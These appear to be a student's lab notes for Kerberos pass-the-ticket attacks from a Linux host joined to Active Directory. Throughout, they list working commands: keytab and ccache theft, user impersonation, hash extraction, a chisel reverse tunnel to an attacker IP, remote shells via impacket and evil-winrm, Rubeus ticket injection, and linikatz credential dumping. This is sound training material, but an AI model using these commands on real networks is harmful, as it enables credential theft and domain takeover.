
>Although not common, Linux computers can connect to Active Directory to provide centralized identity management and integrate with the organization's systems, giving users the ability to have a single identity to authenticate on Linux and Windows computers.

> A Linux computer connected to Active Directory commonly uses Kerberos as authentication. Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.

---

#### Linux Auth via Port Forward

```
$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

#ssh #port_forwarding

	 realm - Check If Linux Machine is Domain Joined

```
$ realm list
```

#realm

	 PS - Check if Linux Machine is Domain Joined

```
$ ps -ef | grep -i "winbind\|sssd"
```

#ps 
## Finding Keytab Files

	 Using Find to Search for Files with Keytab in the Name

```
$ find / -name *keytab* -ls 2>/dev/null
```

#find

	 Identifying Keytab Files in Cronjobs

```
$ crontab -l
```

#crontab 

## Finding ccache Files


	 Reviewing Environment Variables for ccache Files.

```
$ env | grep -i krb5
```

	  Searching for ccache Files in /tmp

```
$ ls -la /tmp
```

#ccache

## Abusing KeyTab Files

	  Listing keytab File Information

```
$ klist -k -t 
```

	 Impersonating a User with a keytab

```
$ klist 
```

```
$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

```
$ klist 
```

#keytab 
#### Connecting to SMB Share as Carlos

```
$ smbclient //dc01/carlos -k -c ls
```

```
$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

   >The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.

#smbclient #keytab 
#### Looking for ccache Files

```
$ ls -la /tmp
```

		 Identifying Group Membership with the id Command

```
$id julio@inlanefreight.htb
```

#### Importing the ccache File into our Current Session

```
root@linux01:~# klist
```

```
$ cp /tmp/krb5cc_647401106_I8I133 .
$ export KRB5CCNAME=/root/krb5cc_647401106_I8I133
$ klist
```

```
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
```

#kerberos #smbclient 

## Using Linux Attack Tools with Kerberos

		 Host File Modified

```
$ cat /etc/hosts
```

		 Proxychains Configuration File

```
$ cat /etc/proxychains.conf
```

		 Download Chisel to our Attack Host

```
$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```

#github

```
$ gzip -d chisel_1.7.7_linux_amd64.gz
```

```
$ mv chisel_* chisel && chmod +x ./chisel
```

```
$ sudo ./chisel server --reverse 
```


		 Connect to MS01 with xfreerdp

```
$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

#xfreerdp 

		Execute chisel from MS01

```c
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

#chisel 
#### Setting the KRB5CCNAME Environment Variable

```
$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

#kerberos 
#### Using Impacket with proxychains and Kerberos Authentication

```
$ proxychains impacket-wmiexec dc01 -k
```

#impacket #impacket_wmiexec

### Evil-Winrm

>To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`.

		 Installing Kerberos Authentication Package

```
$ sudo apt-get install krb5-user -y
```

#evil-winrm #kerberos 
#### Kerberos Configuration File for INLANEFREIGHT.HTB

```
$ cat /etc/krb5.conf
```

#kerberos 
#### Using Evil-WinRM with Kerberos

```
$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

#proxychain #evil-winrm 
#### Impacket Ticket Converter

```
$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

#impacket #impacket_ticketConverter
#### Importing Converted Ticket into Windows Session with Rubeus

```c
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

#rebeus 
## Linikatz

> [Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to `Mimikatz` to UNIX environments.

```
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

#github 

```
$ /opt/linikatz.sh
```

#linikatz
